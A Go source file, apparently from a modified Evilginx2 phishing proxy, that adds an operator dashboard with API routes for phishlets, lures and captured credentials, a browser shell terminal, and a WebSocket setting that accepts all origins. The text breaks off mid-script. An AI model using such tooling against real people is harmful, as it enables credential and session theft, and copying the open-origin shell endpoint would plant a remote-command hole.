package core

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type WebServer struct {
	server            *http.Server
	cfg               *Config
	db                *database.Database
	proxy             *HttpProxy
	upgrader          websocket.Upgrader
	clients           map[*websocket.Conn]bool
	clientsMutex      sync.RWMutex
	sessions          map[string]*AuthSession
	sessionsMutex     sync.RWMutex
	terminalSessions  map[string]*TerminalSession
	terminalMutex     sync.RWMutex
	commandFilter     *CommandFilter
	isRunning         bool
}

type AuthSession struct {
	Token     string
	CreatedAt time.Time
	ExpiresAt time.Time
	IPAddress string
}

type AuthRequest struct {
	Key string `json:"key"`
}

type AuthResponse struct {
	Success bool   `json:"success"`
	Token   string `json:"token,omitempty"`
	Message string `json:"message,omitempty"`
}

type AuthStatusResponse struct {
	IsSetup         bool `json:"is_setup"`
	IsLocked        bool `json:"is_locked"`
	IsAuthenticated bool `json:"is_authenticated"`
}

type SetupResponse struct {
	Success bool   `json:"success"`
	Key     string `json:"key,omitempty"`
	Message string `json:"message,omitempty"`
}

type DashboardData struct {
	Sessions      []*database.Session `json:"sessions"`
	ActiveSessions int                `json:"active_sessions"`
	TotalSessions  int                `json:"total_sessions"`
	ServerStats   *ServerStats       `json:"server_stats"`
	Phishlets     []PhishletInfo     `json:"phishlets"`
}

type ServerStats struct {
	Uptime       string `json:"uptime"`
	Domain       string `json:"domain"`
	IPAddress    string `json:"ip_address"`
	HTTPSPort    int    `json:"https_port"`
	DNSPort      int    `json:"dns_port"`
	TelegramEnabled bool `json:"telegram_enabled"`
}

type PhishletInfo struct {
	Name     string `json:"name"`
	Enabled  bool   `json:"enabled"`
	Hostname string `json:"hostname"`
	Visible  bool   `json:"visible"`
}

type WebSocketMessage struct {
	Type    string      `json:"type"`
	Data    interface{} `json:"data"`
	Time    time.Time   `json:"time"`
}

type TerminalSession struct {
	ID           string
	CMD          *exec.Cmd
	PTY          *os.File
	Conn         *websocket.Conn
	CreatedAt    time.Time
	LastActivity time.Time
	UserID       string
	IsActive     bool
	mutex        sync.RWMutex
}

type CommandFilter struct {
	blockedCommands []string
	blockedPaths    []string
}

var startTime = time.Now()

func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServer {
	ws := &WebServer{
		cfg:              cfg,
		db:               db,
		proxy:            proxy,
		clients:          make(map[*websocket.Conn]bool),
		sessions:         make(map[string]*AuthSession),
		terminalSessions: make(map[string]*TerminalSession),
		commandFilter:    NewCommandFilter(),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true // Allow all origins for development
			},
		},
	}

	router := mux.NewRouter()
	
	// Dashboard routes
	router.HandleFunc("/", ws.handleDashboard).Methods("GET")
	router.HandleFunc("/dashboard", ws.handleDashboard).Methods("GET")
	
	// API routes
	router.HandleFunc("/api/sessions", ws.handleAPISessions).Methods("GET")
	router.HandleFunc("/api/sessions/{id}", ws.handleAPISessionDetails).Methods("GET")
	router.HandleFunc("/api/stats", ws.handleAPIStats).Methods("GET")
	router.HandleFunc("/api/phishlets", ws.handleAPIPhishlets).Methods("GET")
	router.HandleFunc("/api/phishlets/{name}/enable", ws.handleAPIPhishletEnable).Methods("POST")
	router.HandleFunc("/api/phishlets/{name}/disable", ws.handleAPIPhishletDisable).Methods("POST")
	router.HandleFunc("/api/phishlets/{name}/hostname", ws.handleAPIPhishletHostname).Methods("POST")
	router.HandleFunc("/api/phishlets/{name}/credentials", ws.handleAPIPhishletCredentials).Methods("GET")
	
	// Lures API routes
	router.HandleFunc("/api/lures", ws.handleAPILures).Methods("GET")
	router.HandleFunc("/api/lures", ws.handleAPICreateLure).Methods("POST")
	router.HandleFunc("/api/lures/{id}", ws.handleAPIUpdateLure).Methods("PUT")
	router.HandleFunc("/api/lures/{id}", ws.handleAPIDeleteLure).Methods("DELETE")
	router.HandleFunc("/api/lures/{id}/url", ws.handleAPILureGetURL).Methods("GET")
	
	// Authentication routes
	router.HandleFunc("/api/auth/status", ws.handleAuthStatus).Methods("GET")
	router.HandleFunc("/api/auth/setup", ws.handleAuthSetup).Methods("POST")
	router.HandleFunc("/api/auth/login", ws.handleAuthLogin).Methods("POST")
	router.HandleFunc("/api/auth/logout", ws.handleAuthLogout).Methods("POST")
	router.HandleFunc("/api/auth/lock", ws.handleAuthLock).Methods("POST")
	router.HandleFunc("/api/auth/unlock", ws.handleAuthUnlock).Methods("POST")
	
	// WebSocket endpoint
	router.HandleFunc("/ws", ws.handleWebSocket).Methods("GET")
	
	// Terminal WebSocket endpoint
	router.HandleFunc("/ws/terminal", ws.handleTerminalWebSocket).Methods("GET")
	
	// Static file serving
	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static/"))))

	ws.server = &http.Server{
		Addr:         fmt.Sprintf(":%d", cfg.GetWebPort()),
		Handler:      router,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}

	return ws
}

func (ws *WebServer) Start() error {
	if ws.isRunning {
		return fmt.Errorf("web server is already running")
	}

	go func() {
		log.Info("starting web dashboard on port %d", ws.cfg.GetWebPort())
		if err := ws.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("web server error: %v", err)
		}
	}()

	ws.isRunning = true
	return nil
}

func (ws *WebServer) Stop() error {
	if !ws.isRunning {
		return nil
	}

	ws.isRunning = false
	return ws.server.Close()
}

func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
	dashboardHTML := `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Evilginx Dashboard</title>
    <style>
        /* Modern Color Variables - Cursor Inspired */
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-tertiary: #21262d;
            --bg-hover: #30363d;
            --border-primary: #30363d;
            --border-secondary: #21262d;
            --text-primary: #f0f6fc;
            --text-secondary: #8b949e;
            --text-muted: #656d76;
            --accent-primary: #2f81f7;
            --accent-secondary: #238636;
            --accent-danger: #da3633;
            --accent-warning: #d29922;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --shadow-sm: 0 1px 3px 0 rgba(0, 0, 0, 0.3);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.4);
            --blur-sm: blur(8px);
            --blur-md: blur(16px);
            --radius-sm: 6px;
            --radius-md: 8px;
            --radius-lg: 12px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            line-height: 1.6;
            font-size: 14px;
            overflow-x: hidden;
        }

        /* Enhanced Glassmorphism Effects */
        .glass-card {
            background: var(--glass-bg);
            backdrop-filter: var(--blur-md);
            border: 1px solid var(--glass-border);
            border-radius: var(--radius-lg);
            box-shadow: var(--shadow-md);
        }

        .glass-card-sm {
            background: var(--glass-bg);
            backdrop-filter: var(--blur-sm);
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-md);
            box-shadow: var(--shadow-sm);
        }

        /* Modern Button System */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 500;
            line-height: 1.4;
            border: 1px solid transparent;
            border-radius: var(--radius-sm);
            cursor: pointer;
            transition: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
            text-decoration: none;
            white-space: nowrap;
            user-select: none;
            background: none;
        }

        .btn:focus {
            outline: 2px solid var(--accent-primary);
            outline-offset: 2px;
        }

        .btn-primary {
            background: var(--accent-primary);
            color: white;
            border-color: var(--accent-primary);
        }

        .btn-primary:hover {
            background: #1f6feb;
            border-color: #1f6feb;
            transform: translateY(-1px);
            box-shadow: var(--shadow-md);
        }

        .btn-secondary {
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border-color: var(--border-primary);
        }

        .btn-secondary:hover {
            background: var(--bg-hover);
            border-color: var(--border-secondary);
            transform: translateY(-1px);
            box-shadow: var(--shadow-sm);
        }

        .btn-success {
            background: var(--accent-secondary);
            color: white;
            border-color: var(--accent-secondary);
        }

        .btn-success:hover {
            background: #2ea043;
            border-color: #2ea043;
            transform: translateY(-1px);
            box-shadow: var(--shadow-md);
        }

        .btn-danger {
            background: var(--accent-danger);
            color: white;
            border-color: var(--accent-danger);
        }

        .btn-danger:hover {
            background: #c93c37;
            border-color: #c93c37;
            transform: translateY(-1px);
            box-shadow: var(--shadow-md);
        }

        .btn-sm {
            padding: 4px 8px;
            font-size: 12px;
            border-radius: 4px;
        }

        .btn-lg {
            padding: 12px 24px;
            font-size: 16px;
            border-radius: var(--radius-md);
        }

        /* Modal System */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: var(--blur-sm);
        }

        .modal.active {
            display: flex;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.2s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            background: var(--bg-secondary);
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-lg);
            padding: 32px;
            width: 90%;
            max-width: 500px;
            text-align: center;
            box-shadow: var(--shadow-lg);
            animation: slideUp 0.3s ease-out;
            max-height: 80vh;
            overflow-y: auto;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .modal h2 {
            color: var(--text-primary);
            margin-bottom: 16px;
            font-size: 20px;
            font-weight: 600;
        }

        .modal p {
            color: var(--text-secondary);
            margin-bottom: 24px;
            line-height: 1.5;
        }

        /* Setup Steps */
        .setup-steps {
            text-align: left;
        }

        .step {
            display: none;
            padding: 20px 0;
        }

        .step.active {
            display: block;
        }

        .step h3 {
            color: var(--text-primary);
            margin-bottom: 12px;
            font-size: 18px;
            font-weight: 600;
        }

        /* Key Display */
        .key-display {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-md);
            padding: 16px;
            margin: 20px 0;
            font-family: 'SF Mono', Monaco, 'Inconsolata', 'Roboto Mono', monospace;
            font-size: 14px;
            color: var(--accent-secondary);
            display: flex;
            justify-content: space-between;
            align-items: center;
            word-break: break-all;
            gap: 12px;
        }

        .key-warning {
            background: rgba(210, 153, 34, 0.1);
            border: 1px solid rgba(210, 153, 34, 0.3);
            border-radius: var(--radius-md);
            padding: 16px;
            margin: 20px 0;
            color: var(--accent-warning);
            font-size: 13px;
            line-height: 1.5;
        }

        /* Form Elements */
        .form-group {
            margin: 20px 0;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-primary);
            font-weight: 500;
            font-size: 13px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-md);
            background: var(--bg-tertiary);
            color: var(--text-primary);
            font-size: 14px;
            transition: all 0.15s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 2px rgba(47, 129, 247, 0.2);
        }

        .form-group input::placeholder {
            color: var(--text-muted);
        }

        /* Error Messages */
        .error {
            background: rgba(218, 54, 51, 0.1);
            border: 1px solid rgba(218, 54, 51, 0.3);
            border-radius: var(--radius-md);
            padding: 12px 16px;
            margin: 12px 0;
            color: var(--accent-danger);
            font-size: 13px;
            line-height: 1.4;
        }

        .hidden {
            display: none !important;
        }

        /* Auth Controls */
        .auth-controls {
            position: fixed;
            top: 16px;
            right: 16px;
            z-index: 999;
            display: flex;
            gap: 8px;
        }

        /* Container Layout */
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 24px;
        }

        /* Header */
        .header {
            background: var(--bg-secondary);
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-lg);
            padding: 40px;
            margin-bottom: 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--accent-primary), transparent);
        }

        .header h1 {
            font-size: 2.5rem;
            font-weight: 700;
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 8px;
            letter-spacing: -0.02em;
        }

        .header p {
            color: var(--text-secondary);
            font-size: 16px;
            font-weight: 400;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }

        .stat-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-lg);
            padding: 24px;
            text-align: center;
            transition: all 0.2s ease;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--accent-primary);
            transform: scaleX(0);
            transition: transform 0.3s ease;
            transform-origin: left;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            border-color: var(--border-secondary);
            box-shadow: var(--shadow-md);
        }

        .stat-card:hover::before {
            transform: scaleX(1);
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 8px;
            color: var(--text-primary);
            line-height: 1;
        }

        .stat-label {
            color: var(--text-secondary);
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-weight: 500;
        }

        /* Sections */
        .sessions-section {
            background: var(--bg-secondary);
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-lg);
            padding: 24px;
            margin-bottom: 24px;
        }

        .section-title {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 20px;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .section-title::before {
            content: '';
            width: 4px;
            height: 20px;
            background: var(--accent-primary);
            border-radius: 2px;
        }

        .section-controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 8px;
        }

        /* Enhanced Table */
        .sessions-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 16px;
            font-size: 13px;
        }

        .sessions-table th,
        .sessions-table td {
            padding: 12px 16px;
            text-align: left;
            border-bottom: 1px solid var(--border-primary);
        }

        .sessions-table th {
            background: var(--bg-tertiary);
            color: var(--text-secondary);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-size: 11px;
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .sessions-table tbody tr {
            transition: all 0.15s ease;
        }

        .sessions-table tbody tr:hover {
            background: var(--bg-tertiary);
        }

        .sessions-table td {
            color: var(--text-primary);
        }

        /* Status Badges */
        .status-badge {
            display: inline-flex;
            align-items: center;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.25px;
        }

        .status-captured {
            background: rgba(46, 160, 67, 0.15);
            color: var(--accent-secondary);
            border: 1px solid rgba(46, 160, 67, 0.3);
        }

        .status-empty {
            background: rgba(139, 148, 158, 0.15);
            color: var(--text-secondary);
            border: 1px solid rgba(139, 148, 158, 0.3);
        }

        /* Connection Status */
        .connection-status {
            position: fixed;
            top: 16px;
            left: 16px;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.25px;
            transition: all 0.3s ease;
            backdrop-filter: var(--blur-sm);
        }

        .connection-status.connected {
            background: rgba(46, 160, 67, 0.15);
            color: var(--accent-secondary);
            border: 1px solid rgba(46, 160, 67, 0.3);
        }

        .connection-status.disconnected {
            background: rgba(218, 54, 51, 0.15);
            color: var(--accent-danger);
            border: 1px solid rgba(218, 54, 51, 0.3);
        }

        /* Loading State */
        .loading {
            text-align: center;
            padding: 60px 20px;
            color: var(--text-secondary);
        }

        .loading::before {
            content: '';
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid var(--border-primary);
            border-radius: 50%;
            border-top-color: var(--accent-primary);
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Phishlets Grid */
        .phishlets-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
            gap: 16px;
            margin-top: 16px;
        }

        .phishlet-card {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-md);
            padding: 20px;
            transition: all 0.2s ease;
            position: relative;
        }

        .phishlet-card:hover {
            border-color: var(--border-secondary);
            transform: translateY(-1px);
            box-shadow: var(--shadow-sm);
        }

        .phishlet-name {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 12px;
            color: var(--text-primary);
        }

        .phishlet-status {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            font-size: 13px;
        }

        .phishlet-status > span:first-child {
            color: var(--text-secondary);
            font-weight: 500;
        }

        .phishlet-status > span:last-child {
            color: var(--text-primary);
        }

        .phishlet-actions {
            display: flex;
            gap: 8px;
            margin-top: 16px;
            flex-wrap: wrap;
        }

        .phishlet-actions .btn {
            flex: 1;
            min-width: 100px;
            justify-content: center;
            font-size: 12px;
        }

        /* Auto Refresh Indicator */
        .auto-refresh {
            position: fixed;
            bottom: 16px;
            right: 16px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-primary);
            border-radius: 20px;
            padding: 8px 16px;
            color: var(--text-secondary);
            font-size: 12px;
            font-weight: 500;
            backdrop-filter: var(--blur-sm);
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .auto-refresh::before {
            content: '●';
            color: var(--accent-secondary);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        /* Terminal Modal */
        .terminal-modal {
            z-index: 1001;
        }

        .terminal-content {
            width: 90%;
            max-width: 1200px;
            height: 80vh;
            max-height: 700px;
            padding: 0;
            background: var(--bg-primary);
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-lg);
            overflow: hidden;
            box-shadow: var(--shadow-lg);
        }

        .terminal-header {
            background: var(--bg-secondary);
            padding: 16px 24px;
            border-bottom: 1px solid var(--border-primary);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .terminal-header h2 {
            color: var(--text-primary);
            margin: 0;
            font-size: 16px;
            font-weight: 600;
        }

        .terminal-controls {
            display: flex;
            gap: 8px;
            align-items: center;
        }

        .terminal-warning {
            background: rgba(210, 153, 34, 0.1);
            color: var(--accent-warning);
            padding: 12px 24px;
            border-bottom: 1px solid var(--border-primary);
            font-size: 13px;
            line-height: 1.4;
        }

        .terminal-container {
            height: calc(100% - 120px);
            background: var(--bg-primary);
            position: relative;
            overflow: hidden;
        }

        .terminal-container .xterm {
            height: 100%;
            width: 100%;
            padding: 16px;
        }

        .terminal-container .xterm .xterm-viewport {
            overflow-y: auto;
        }

        .terminal-container .xterm .xterm-screen {
            background: var(--bg-primary);
        }

        .terminal-container .xterm .xterm-cursor {
            color: var(--text-primary);
            background: var(--accent-primary);
        }

        .terminal-container .xterm .xterm-selection {
            background: rgba(47, 129, 247, 0.3);
        }

        /* Toast Notifications */
        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--bg-secondary);
            color: var(--text-primary);
            padding: 12px 20px;
            border-radius: var(--radius-md);
            border: 1px solid var(--border-primary);
            box-shadow: var(--shadow-lg);
            z-index: 2000;
            animation: slideUpToast 0.3s ease-out;
            max-width: 400px;
            word-wrap: break-word;
        }

        .toast.success {
            border-color: var(--accent-secondary);
            background: rgba(35, 134, 54, 0.1);
        }

        .toast.error {
            border-color: var(--accent-danger);
            background: rgba(218, 54, 51, 0.1);
        }

        @keyframes slideUpToast {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 16px;
            }

            .header {
                padding: 24px;
            }

            .header h1 {
                font-size: 2rem;
            }

            .stats-grid {
                grid-template-columns: 1fr;
                gap: 12px;
            }

            .phishlets-grid {
                grid-template-columns: 1fr;
                gap: 12px;
            }

            .phishlet-actions {
                flex-direction: column;
            }

            .phishlet-actions .btn {
                min-width: unset;
            }

            .auth-controls {
                position: relative;
                top: unset;
                right: unset;
                margin-bottom: 16px;
                justify-content: center;
                flex-wrap: wrap;
            }

            .connection-status {
                position: relative;
                top: unset;
                left: unset;
                margin-bottom: 16px;
                display: inline-block;
            }

            .sessions-table {
                font-size: 12px;
            }

            .sessions-table th,
            .sessions-table td {
                padding: 8px 12px;
            }

            .section-controls {
                flex-direction: column;
                align-items: stretch;
                gap: 12px;
            }

            .terminal-content {
                width: 95%;
                height: 90vh;
            }

            .modal-content {
                width: 95%;
                max-width: unset;
                padding: 24px 20px;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 12px;
            }

            .sessions-table {
                font-size: 11px;
            }

            .sessions-table th,
            .sessions-table td {
                padding: 6px 8px;
            }

            .phishlet-card {
                padding: 16px;
            }

            .btn {
                padding: 6px 12px;
                font-size: 12px;
            }

            .btn-lg {
                padding: 10px 20px;
                font-size: 14px;
            }
        }

        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-primary);
            border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--border-secondary);
        }

        /* Focus Visible */
        .btn:focus-visible,
        input:focus-visible {
            outline: 2px solid var(--accent-primary);
            outline-offset: 2px;
        }

        /* Selection */
        ::selection {
            background: rgba(47, 129, 247, 0.3);
            color: var(--text-primary);
        }
    </style>
</head>
<body>
    <!-- Authentication Modals -->
    <div id="setupWizard" class="modal">
        <div class="modal-content">
            <h2>🔐 Setup Web Panel Security</h2>
            <div class="setup-steps">
                <div class="step active" data-step="1">
                    <h3>Welcome</h3>
                    <p>Secure your web panel with a unique authentication key.</p>
                    <p>This key will be required to access the dashboard.</p>
                    <button class="btn btn-primary btn-lg" onclick="startSetup()">Get Started</button>
                </div>
                
                <div class="step" data-step="2">
                    <h3>🔑 Your Security Key</h3>
                    <p>Save this key in a secure location. You will need it to access the dashboard.</p>
                    <div class="key-display">
                        <code id="generatedKey"></code>
                        <button class="btn btn-secondary btn-sm" onclick="copyKey()">📋 Copy</button>
                    </div>
                    <div class="key-warning">
                        ⚠️ <strong>Important:</strong> Save this key securely! It cannot be recovered if lost.
                    </div>
                    <button class="btn btn-primary btn-lg" onclick="confirmSetup()">I've Saved It</button>
                </div>
                
                <div class="step" data-step="3">
                    <h3>✅ Setup Complete</h3>
                    <p>Your web panel is now secured with authentication!</p>
                    <p>You can now access the dashboard and use the lock feature.</p>
                    <button class="btn btn-success btn-lg" onclick="finishSetup()">Continue to Dashboard</button>
                </div>
            </div>
        </div>
    </div>

    <div id="loginModal" class="modal">
        <div class="modal-content">
            <h2>🔐 Enter Security Key</h2>
            <p>Please enter your security key to access the dashboard.</p>
            <form id="loginForm">
                <div class="form-group">
                    <label for="securityKey">Security Key:</label>
                    <input type="password" id="securityKey" placeholder="Enter your security key" required>
                </div>
                <button type="submit" class="btn btn-primary btn-lg">Unlock Dashboard</button>
            </form>
            <div id="loginError" class="error hidden"></div>
        </div>
    </div>

    <div id="unlockModal" class="modal">
        <div class="modal-content">
            <h2>🔓 Unlock Panel</h2>
            <p>The panel is currently locked. Enter your security key to unlock it.</p>
            <form id="unlockForm">
                <div class="form-group">
                    <label for="unlockKey">Security Key:</label>
                    <input type="password" id="unlockKey" placeholder="Enter your security key" required>
                </div>
                <button type="submit" class="btn btn-primary btn-lg">Unlock Panel</button>
            </form>
            <div id="unlockError" class="error hidden"></div>
        </div>
    </div>

    <!-- Generic Modal for Messages -->
    <div id="messageModal" class="modal">
        <div class="modal-content">
            <h2 id="modalTitle">Message</h2>
            <p id="modalMessage">This is a message.</p>
            <div id="modalButtons">
                <button class="btn btn-primary" onclick="closeModal('messageModal')">OK</button>
            </div>
        </div>
    </div>

    <!-- Confirm Modal -->
    <div id="confirmModal" class="modal">
        <div class="modal-content">
            <h2 id="confirmTitle">Confirm Action</h2>
            <p id="confirmMessage">Are you sure?</p>
            <div id="confirmButtons" style="display: flex; gap: 12px; justify-content: center;">
                <button class="btn btn-secondary" onclick="closeModal('confirmModal')">Cancel</button>
                <button class="btn btn-danger" id="confirmAction">Confirm</button>
            </div>
        </div>
    </div>

    <!-- Terminal Modal -->
    <div id="terminalModal" class="modal terminal-modal">
        <div class="modal-content terminal-content">
            <div class="terminal-header">
                <h2>🖥️ VPS Terminal</h2>
                <div class="terminal-controls">
                    <span class="connection-status" id="terminalStatus">Disconnected</span>
                    <button class="btn btn-secondary btn-sm" onclick="clearTerminal()">🧹 Clear</button>
                    <button class="btn btn-secondary btn-sm" onclick="closeTerminal()">✖️ Close</button>
                </div>
            </div>
            <div class="terminal-warning">
                ⚠️ <strong>Security Notice:</strong> This terminal has command filtering enabled. Dangerous commands are automatically blocked for security.
            </div>
            <div class="terminal-container">
                <div id="terminal"></div>
            </div>
        </div>
    </div>

    <!-- Authentication Controls -->
    <div class="auth-controls" id="authControls" style="display: none;">
        <button class="btn btn-secondary btn-sm" onclick="openTerminal()">🖥️ Terminal</button>
        <button class="btn btn-secondary btn-sm" onclick="lockPanel()">🔒 Lock Panel</button>
    </div>

    <div class="container">
        <div class="header">
            <h1>🎣 Evilginx Dashboard</h1>
            <p>Real-time monitoring and session management</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="total-sessions">0</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="active-sessions">0</div>
                <div class="stat-label">Active Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="captured-sessions">0</div>
                <div class="stat-label">Captured Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="uptime">0h 0m</div>
                <div class="stat-label">Uptime</div>
            </div>
        </div>

        <div class="sessions-section">
            <h2 class="section-title">📊 Recent Sessions</h2>
            <div id="sessions-content" class="loading">Loading sessions...</div>
        </div>

        <div class="sessions-section">
            <h2 class="section-title">🎯 Phishlets</h2>
            <div id="phishlets-content" class="loading">Loading phishlets...</div>
        </div>

        <div class="sessions-section">
            <h2 class="section-title">🎣 Lures</h2>
            <div style="margin-bottom: 20px;">
                <button class="btn btn-primary" onclick="showCreateLureModal()">➕ Create New Lure</button>
            </div>
            <div id="lures-content" class="loading">Loading lures...</div>
        </div>
    </div>

    <div class="connection-status disconnected" id="connection-status">
        Disconnected
    </div>

    <div class="auto-refresh">
        🔄 Auto-refresh enabled
    </div>

    <script>
        // Utility Functions for Modern UI
        function showToast(message, type = 'info') {
            // Remove existing toasts
            const existingToasts = document.querySelectorAll('.toast');
            existingToasts.forEach(toast => toast.remove());
            
            const toast = document.createElement('div');
            toast.className = 'toast' + (type ? ' ' + type : '');
            toast.textContent = message;
            document.body.appendChild(toast);
            
            setTimeout(() => {
                toast.remove();
            }, 4000);
        }

        function showModal(title, message, buttons = [{ text: 'OK', class: 'btn-primary' }]) {
            const modal = document.getElementById('messageModal');
            const titleEl = document.getElementById('modalTitle');
            const messageEl = document.getElementById('modalMessage');
            const buttonsEl = document.getElementById('modalButtons');
            
            titleEl.textContent = title;
            messageEl.textContent = message;
            
            buttonsEl.innerHTML = '';
            buttons.forEach(button => {
                const btn = document.createElement('button');
                btn.className = 'btn ' + (button.class || 'btn-secondary');
                btn.textContent = button.text;
                btn.onclick = button.onclick || function() { closeModal('messageModal'); };
                buttonsEl.appendChild(btn);
            });
            
            modal.classList.add('active');
        }

        function showConfirm(title, message, onConfirm, confirmText = 'Confirm') {
            const modal = document.getElementById('confirmModal');
            const titleEl = document.getElementById('confirmTitle');
            const messageEl = document.getElementById('confirmMessage');
            const actionBtn = document.getElementById('confirmAction');
            
            titleEl.textContent = title;
            messageEl.textContent = message;
            actionBtn.textContent = confirmText;
            actionBtn.onclick = function() {
                closeModal('confirmModal');
                if (onConfirm) onConfirm();
            };
            
            modal.classList.add('active');
        }

        function closeModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.remove('active');
            }
        }

        function downloadText(filename, content) {
            const blob = new Blob([content], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
        }

        function downloadJSON(filename, data) {
            const content = JSON.stringify(data, null, 2);
            downloadText(filename, content);
        }

        // Authentication System
        class AuthManager {
            constructor() {
                this.token = localStorage.getItem('authToken');
                this.checkAuthStatus();
            }

            async checkAuthStatus() {
                try {
                    const response = await fetch('/api/auth/status', {
                        headers: { 'Authorization': this.token || '' }
                    });
                    const data = await response.json();
                    
                    if (!data.is_setup) {
                        this.showSetupWizard();
